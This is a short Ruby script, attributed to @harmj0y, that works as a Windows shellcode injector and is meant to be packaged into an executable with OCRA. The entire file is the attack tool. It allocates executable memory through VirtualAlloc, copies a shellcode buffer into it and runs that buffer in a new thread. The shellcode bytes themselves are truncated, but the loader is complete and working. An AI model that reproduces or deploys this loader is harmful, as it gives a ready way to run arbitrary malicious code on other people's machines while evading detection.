#
# Ruby shellcode injector that utilizes win32/api
# Ready for packaging with OCRA
#
# By: @harmj0y
#

require 'rubygems'
require 'win32/api'
include Win32
exit if Object.const_defined?(:Ocra)

# set up all the WinAPI function declarations
VirtualAlloc = API.new('VirtualAlloc', 'IIII', 'I')
RtlMoveMemory = API.new('RtlMoveMemory', 'IPI', 'V')
CreateThread = API.new('CreateThread', 'IIIIIP', 'I')
WaitForSingleObject = API.new('WaitForSingleObject', 'II', 'I')

# our shellcode
payload = "\xfc\xe8\x89..."

# Reserve the necessary amount of virtual address space
# VirtualAlloc needs to have at least 0x1000 specified as the length otherwise it'll fail
ptr = VirtualAlloc.call(0,(payload.length > 0x1000 ? payload.length : 0x1000), 0x1000, 0x40)

# move the payload buffer into the allocated area
x = RtlMoveMemory.call(ptr,payload,payload.length)

# start the thread
handleID = CreateThread.call(0,0,ptr,0,0,0)

# wait a long time for the thread to return
x = WaitForSingleObject.call(handleID,0xFFFFFFF)
